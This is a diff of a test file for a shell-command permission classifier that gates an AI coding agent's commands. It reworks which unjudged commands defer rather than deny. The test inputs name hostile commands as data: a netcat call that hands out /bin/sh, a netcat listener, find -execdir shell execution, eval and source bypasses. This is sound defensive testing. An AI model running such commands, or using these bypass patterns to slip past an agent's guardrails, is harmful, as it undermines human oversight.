@@ -472,7 +472,10 @@ SHELL_POLICY_CASES = [
     # the write side still asks and a substituting inner command is denied.
     DecisionCase(input="diff <(git status) <(git log)", effect="allow"),
     DecisionCase(input="diff <(sudo id) f", effect="ask"),
-    DecisionCase(input="diff <(cat $(x)) f", effect="deny"),
+    # `x` is a command no row covers, which is a deferral rather than a
+    # refusal wherever it is spelled — nesting it inside a substitution does
+    # not make the missing row into a judgment.
+    DecisionCase(input="diff <(cat $(x)) f", effect="defer"),
     DecisionCase(input="cat >(tee f)", effect="ask"),
     # Loops classify their condition and body recursively; literal for-words
     # instantiate the body, and opaque word lists gate guarded arguments.
@@ -760,15 +763,18 @@ SHELL_POLICY_CASES = [
         input='uv run --python "$(cat v.txt)" lup-devtools dev check', effect="deny"
     ),
     DecisionCase(input='uv run "$(cat t.txt)" dev check', effect="deny"),
-    DecisionCase(input="uv run ./pytest", effect="deny"),
-    DecisionCase(input="uv run /tmp/tool --help", effect="deny"),
+    # A path naming an executable nobody wrote a row for, which is the plain
+    # unjudged case wherever `uv run` puts it — unlike the two above, whose
+    # substituted arguments leave the classifier unable to say what runs.
+    DecisionCase(input="uv run ./pytest", effect="defer"),
+    DecisionCase(input="uv run /tmp/tool --help", effect="defer"),
     DecisionCase(input="printf . | xargs find . -delete", effect="ask"),
     DecisionCase(input="find . -execdir sh -c id ;", effect="deny"),
     DecisionCase(input="sort f && python -c 'x'", effect="deny"),
     # The decision lattice: unjudged commands deny and bounce to the agent,
     # judged-risky rows ask, and a leading escalation marker promotes a deny
     # or ask to an approval question carrying the agent's stated reason.
-    DecisionCase(input="cargo build", effect="deny"),
+    DecisionCase(input="cargo build", effect="defer"),
     DecisionCase(input="pip install requests", effect="deny"),
     # Credential-agent family: the pure listing form is the declared
     # read-only exception; every other form is a judged deny.
@@ -903,14 +909,20 @@ SHELL_POLICY_CASES = [
     DecisionCase(input="nc localhost 8000", effect="deny"),
     DecisionCase(input="nc -l -p 4444", effect="deny"),
     DecisionCase(input="nc -z -e /bin/sh host 22", effect="deny"),
-    # Sandboxed executions: machinery bail-outs defer to the OS boundary,
-    # judged decisions hold, and escalation still promotes to a question.
-    DecisionCase(input="frobnicate --weird", effect="deny"),
+    # A command no row covers defers wherever it runs, boundary or not, so
+    # the pair below records one verdict rather than two. What the four after
+    # it have in common is the opposite: the classifier could not establish
+    # what would run — an option leaving a conditional allowance unsettled,
+    # an argument that could expand into a guarded flag, a definition whose
+    # body a later call reaches without passing here, a construct that never
+    # parsed. None of those is a missing row, and a boundary does not answer
+    # for them.
+    DecisionCase(input="frobnicate --weird", effect="defer"),
     DecisionCase(input="frobnicate --weird", effect="defer", sandboxed=True),
-    DecisionCase(input="sed --frob 's/a/b/' f", effect="defer", sandboxed=True),
-    DecisionCase(input="sort $UNBOUND f", effect="defer", sandboxed=True),
-    DecisionCase(input="foo() { cat x; }", effect="defer", sandboxed=True),
-    DecisionCase(input="case $m in a) echo a;;", effect="defer", sandboxed=True),
+    DecisionCase(input="sed --frob 's/a/b/' f", effect="deny", sandboxed=True),
+    DecisionCase(input="sort $UNBOUND f", effect="deny", sandboxed=True),
+    DecisionCase(input="foo() { cat x; }", effect="deny", sandboxed=True),
+    DecisionCase(input="case $m in a) echo a;;", effect="deny", sandboxed=True),
     DecisionCase(
         input="git push --delete origin feat",
         effect="ask",
@@ -921,11 +933,13 @@ SHELL_POLICY_CASES = [
     DecisionCase(input="ssh-add -D", effect="deny", sandboxed=True),
     DecisionCase(input="frobnicate; ssh host", effect="ask", sandboxed=True),
     DecisionCase(input="python -c 'x'", effect="deny", sandboxed=True),
-    # An excluded command runs with no OS boundary beneath it, so unjudged
-    # work in it has nothing to defer to and returns to the deny lattice —
-    # including when it rides in beside a command the boundary would confine.
-    DecisionCase(input="quuxify --weird", effect="deny", sandboxed=True),
-    DecisionCase(input="frobnicate; quuxify now", effect="deny", sandboxed=True),
+    # An excluded command runs with no OS boundary beneath it, which used to
+    # return unjudged work in it to the deny lattice. It no longer decides
+    # anything: a missing row defers on its own account, and what the
+    # exclusion changes is what sits underneath — which the reason names and
+    # the verdict does not.
+    DecisionCase(input="quuxify --weird", effect="defer", sandboxed=True),
+    DecisionCase(input="frobnicate; quuxify now", effect="defer", sandboxed=True),
     DecisionCase(input="quuxifyer --weird", effect="defer", sandboxed=True),
     # The toolchain declares its escape, so nothing carries a flag to reach it:
     # unconfined it simply runs, and where a call can be placed it is placed.
@@ -949,12 +963,14 @@ SHELL_POLICY_CASES = [
     DecisionCase(input="codex plugin marketplace --help", effect="allow"),
     DecisionCase(input="git push --help", effect="allow"),
     DecisionCase(input="frobnicate -h", effect="allow"),
-    DecisionCase(input="mysql -h db.example.com", effect="deny"),
-    # A non-interactive host cannot put a question to a human: sandboxed, an
-    # ask rides the OS boundary; unsandboxed it fails closed. A judged deny
-    # is never rescued, and unjudged work defers exactly as it always did.
+    DecisionCase(input="mysql -h db.example.com", effect="defer"),
+    # A non-interactive host cannot put a question to a human, so the ask is
+    # no question and rides whatever sits beneath it — the same answer with
+    # or without the boundary, since the boundary was never what made a
+    # question unanswerable. A worker holding a mailbox is the case this is
+    # not, and refuses instead; that is `relayed` and lives in its own test.
     DecisionCase(
-        input="git push --delete origin feat", effect="deny", interactive=False
+        input="git push --delete origin feat", effect="defer", interactive=False
     ),
     DecisionCase(
         input="git push --delete origin feat",
@@ -985,19 +1001,26 @@ SHELL_POLICY_CASES = [
     DecisionCase(
         input="frobnicate --weird", effect="defer", sandboxed=True, interactive=False
     ),
-    # The classic sourcing bypasses stay outside the vocabulary: deny
-    # unsandboxed, defer to the OS boundary inside it; a deferring segment
-    # among allows keeps the batch deferred.
+    # The classic bypasses are now *inside* the vocabulary, and that is the
+    # whole of why they still refuse: each runs a command this table never
+    # sees, so leaving them to the fallback made them the way around every
+    # rule that does refuse. Judged, they deny under the boundary too — a
+    # judged deny being the one verdict no boundary rescues. A deferring
+    # segment among allows still keeps the batch deferred.
     DecisionCase(input="eval echo x", effect="deny"),
     DecisionCase(input="source setup.sh", effect="deny"),
     DecisionCase(input=". ./env.sh", effect="deny"),
-    DecisionCase(input="eval echo x", effect="defer", sandboxed=True),
-    DecisionCase(input="source setup.sh", effect="defer", sandboxed=True),
+    DecisionCase(input="eval echo x", effect="deny", sandboxed=True),
+    DecisionCase(input="source setup.sh", effect="deny", sandboxed=True),
     DecisionCase(input="frobnicate; ls", effect="defer", sandboxed=True),
     DecisionCase(input="echo $(whoami)", effect="allow", sandboxed=True),
-    DecisionCase(input="echo $(frobnicate)", effect="deny"),
+    DecisionCase(input="echo $(frobnicate)", effect="defer"),
     DecisionCase(input="echo $(frobnicate)", effect="defer", sandboxed=True),
-    DecisionCase(input="git log $(cat names.txt)", effect="defer", sandboxed=True),
+    # A substitution result the classifier cannot read could carry a guarded
+    # flag, which is the condition left unestablished rather than a missing
+    # row — so the boundary does not answer for it and the pair above, whose
+    # inner command is merely unjudged, is the case that defers.
+    DecisionCase(input="git log $(cat names.txt)", effect="deny", sandboxed=True),
     DecisionCase(input="echo `id`", effect="deny", sandboxed=True),
     DecisionCase(
         input="# lup: escalate: unknown tool\nfrobnicate",
@@ -1813,7 +1836,10 @@ def test_curl_screen_consults_the_declared_fetch_scopes() -> None:
     assert effect("curl -sSf https://docs.example.com/") == "allow"
     # Only the declared reporting letters cluster. One that follows redirects
     # or carries a body reaches past the scopes, so it stays unclassified
-    # wherever it is spelled.
+    # wherever it is spelled — and `curl` is allowed on the condition that
+    # the request reads within a declared scope, so an option nobody
+    # classified is that condition left unestablished rather than a rule
+    # nobody wrote.
     assert effect("curl -fsSL https://docs.example.com/") == "deny"
     assert effect("curl -sd a=b https://docs.example.com/api") == "deny"
     assert effect("curl -s https://internal.example.com/x") == "deny"
@@ -2134,7 +2160,9 @@ def test_shell_policy_checks_every_segment_and_deny_wins() -> None:
         ).effect
         == "deny"
     )
-    assert policy.decide(ShellCommand(command="echo $(dangerous)")).effect == "deny"
+    # `dangerous` is a command no row covers, and a substitution does not turn
+    # a missing row into a refusal: it defers exactly as the bare command does.
+    assert policy.decide(ShellCommand(command="echo $(dangerous)")).effect == "defer"
 
 
 def test_shell_policy_allows_control_flow_and_still_refuses_what_outlives_it() -> None:
@@ -2149,10 +2177,21 @@ def test_shell_policy_allows_control_flow_and_still_refuses_what_outlives_it() -
     for builtin in ("continue", "break", "shift", "return", "local", "exit"):
         assert effect(builtin) == "allow", builtin
 
-    # Each of these decides what some later command sees or does, which is what
-    # the read-only list promises a reader it does not touch.
-    for builtin in ("eval", "exec", "export", "declare", "unset"):
+    # These two run a command this table never sees, so they are the way
+    # around every rule that still refuses — written down as denials rather
+    # than left to the fallback, since a judged deny is the one verdict no
+    # boundary rescues.
+    for builtin in ("eval", "exec"):
         assert effect(builtin) == "deny", builtin
+
+    # These three decide what a *later* command sees, and that command is
+    # classified on its own terms when it runs. They sat in one sentence with
+    # the pair above while the fallback refused all five; only the pair was
+    # ever bypassing anything, and denying `export FOO=bar` stopped ordinary
+    # work for nothing. The assignment that would redirect which binary a
+    # later command resolves to is an ask in its own right.
+    for builtin in ("export", "declare", "unset"):
+        assert effect(builtin) == "defer", builtin
 
     # Control flow de-escalates nothing around it: a guarded verb sharing the
     # command keeps its own verdict.
@@ -2269,15 +2308,25 @@ def test_creating_a_file_passes_where_overwriting_one_still_asks(
     assert policy.decide(ShellCommand(command=command, cwd=tmp_path)).effect == "allow"
 
 
-def test_sandbox_escape_reenters_the_deny_lattice() -> None:
+def test_a_sandbox_escape_changes_what_is_beneath_a_deferral_not_the_verdict() -> None:
+    """The escape used to return unjudged work to the deny lattice.
+
+    It no longer decides anything, because the verdict stopped turning on
+    the boundary: a command no row covers defers wherever it runs, and a
+    deferral was never a permission — it hands the call to the runtime's own
+    gate. What the escape changes is what sits underneath when it runs, so
+    that is what the reason reports and the effect does not.
+    """
     policy = ShellPolicy(SHELL_RULES, sandbox_active=True)
     confined = policy.decide(ShellCommand(command="frobnicate --weird"))
-    assert confined.effect == "defer"
     escaped = policy.decide(
         ShellCommand(command="frobnicate --weird", unsandboxed=True)
     )
-    assert escaped.effect == "deny"
-    assert "escalate" in escaped.reason
+
+    assert confined.effect == "defer"
+    assert escaped.effect == "defer"
+    assert "the OS boundary is beneath it" in confined.reason
+    assert "nothing is beneath it" in escaped.reason
 
 
 def test_the_toolchain_carries_its_own_escape_and_is_refused_without_one() -> None:
@@ -2350,8 +2399,18 @@ def test_a_help_probe_of_an_unclassified_command_still_reads() -> None:
     assert read.sandbox == "ambient"
 
 
-def test_non_interactive_denials_do_not_prescribe_escalation() -> None:
-    """Codex hooks cannot complete the approval flow, so they never name it."""
+def test_a_question_with_nobody_to_ask_is_not_asked_and_not_refused() -> None:
+    """Codex hooks cannot complete the approval flow, so they never name it.
+
+    They also never *needed* the refusal that came with it. A question with
+    nobody to put it to is no question, and what used to happen next — a
+    deny prescribing a reshape — was the deny lattice answering for want of
+    a boundary. That answer is gone, so what is left is the deferral: the
+    runtime's own gate decides, and a session at its defaults still asks.
+
+    The worker that does hold a route is the case this is not, and it keeps
+    its refusal — see the relayed test below.
+    """
     interactive = ShellPolicy(SHELL_RULES).decide(
         ShellCommand(command="git push --delete origin feat")
     )
@@ -2360,9 +2419,8 @@ def test_non_interactive_denials_do_not_prescribe_escalation() -> None:
     blocked = ShellPolicy(SHELL_RULES, interactive=False).decide(
         ShellCommand(command="git push --delete origin feat")
     )
-    assert blocked.effect == "deny"
+    assert blocked.effect == "defer"
     assert "escalate" not in blocked.reason
-    assert "allowed vocabulary" in blocked.reason
 
 
 def test_a_reviewed_worker_is_told_the_route_it_actually_has() -> None:
